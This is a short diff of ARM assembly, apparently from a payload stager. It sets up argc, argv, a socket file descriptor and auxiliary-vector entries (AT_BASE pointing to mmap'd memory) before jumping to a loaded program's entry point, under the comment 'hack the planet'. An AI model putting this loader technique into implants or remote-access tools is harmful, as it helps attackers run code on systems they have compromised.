@@ -34,15 +34,16 @@ _start:
   add sp, #256 + 4  @ Add room for initial stack and prog name
   mov r4, #109      @  "m" (0,0,0,109)
   push {r4}         @ On the stack
-  mov r4,#1         @ ARGC
+  mov r4,#2         @ ARGC
   mov r5,sp         @ ARGV[0]
-  mov r6,#0         @ (NULL)
-  mov r7,#0         @ (NULL) (Ending ENV)
-  mov r8,#7         @ AT_BASE
-  mov r9,r1         @ mmap'd address
-  mov r10,#0        @ AT_NULL
-  mov r11,#0
-  push {r4-r11}
+  mov r6,r12        @ socket fd
+  mov r7,#0         @ (NULL)
+  mov r8,#0         @ (NULL) (Ending ENV)
+  mov r9,#7         @ AT_BASE
+  mov r10,r1        @ mmap'd address
+  mov r11,#0        @ AT_NULL
+  mov r12,#0
+  push {r4-r12}
 
   @ hack the planet
   ldr r0, =ENTRY
